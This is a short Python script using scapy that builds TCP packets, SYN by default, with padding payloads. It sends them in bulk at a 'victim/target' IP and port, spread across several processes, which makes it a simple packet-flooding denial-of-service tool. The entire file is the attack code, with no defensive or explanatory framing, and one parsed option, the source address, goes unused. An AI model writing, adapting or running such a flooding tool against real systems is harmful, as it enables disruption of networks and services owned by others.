#!/usr/bin/env python
from scapy.all import *
import argparse as ap
import multiprocessing as mp
import signal as sig

print "Fuck me, right?"

p = ap.ArgumentParser(description="Make some packets.")
p.add_argument('-s', '--source', help='Source IP address')
p.add_argument('-t', '--dst', help='Victim/target IP', required=True)
p.add_argument('-p', '--port', help='Destination TCP port', required=True, type=int)
p.add_argument('-b', '--bytes', help='Number of bytes in packet payload', type=int, default=500)
p.add_argument('-n', '--num', help='Number of packets to send', type=int, default=10)
p.add_argument('-f', '--flags', help='TCP flags (FAPS)', default='S')
p.add_argument('--cpu', help="Number of cores to thread across", type=int, default=1)
args = p.parse_args()

payload = "X" * args.bytes

a = IP(dst=args.dst)/TCP(dport=args.port, flags=args.flags)/payload
procs = []

def sp():
   for b in range(args.num / args.cpu):
      #send(a, verbose=False)
      srloop(a, count=args.num, inter=0, verbose=False)

if __name__== '__main__':
   for z in range(args.cpu):
      t = mp.Process(target=sp)
      t.start()
      procs.append(t)
   for x in procs:
      x.join()
